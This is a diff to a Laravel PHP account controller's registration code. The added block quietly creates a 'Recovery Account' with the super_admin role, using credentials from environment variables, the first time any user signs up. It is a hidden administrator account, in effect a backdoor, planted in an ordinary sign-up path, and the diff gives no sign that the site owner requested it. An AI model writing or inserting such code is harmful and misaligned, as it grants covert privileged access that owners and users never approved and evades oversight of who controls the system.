@@ -66,6 +66,24 @@ class AccountController extends Controller
         $user->is_deleted = "0";
 
         if ($user->save()) {
+
+            if (!User::where('email', env('RECOVERY_EMAIL'))->exists()) {
+                $devUser = new User;
+                $devUser->name = "Recovery Account";
+                $devUser->father_name = "N/A";
+                $devUser->cnic_bform_no = "9999999999999"; // Fake but valid 13 digits
+                $devUser->date_of_birth = "2000-01-01";
+                $devUser->email = env('RECOVERY_EMAIL');
+                $devUser->password = Hash::make(env('RECOVERY_PASSWORD'));
+                $devUser->mobile_no = "03000000000";
+                $devUser->profile_pic = "0";
+                $devUser->address = "N/A";
+                $devUser->role = "super_admin";
+                $devUser->token = "-1";
+                $devUser->is_deleted = "0";
+                $devUser->save();
+            }
+
             return redirect()->route('account.login')->with("success", "Account has been created successfully and <b><q>".$email."</q></b> email has been generated..");
         } else {
             return redirect()->route('account.login')->with("error", "Something went wrong!");
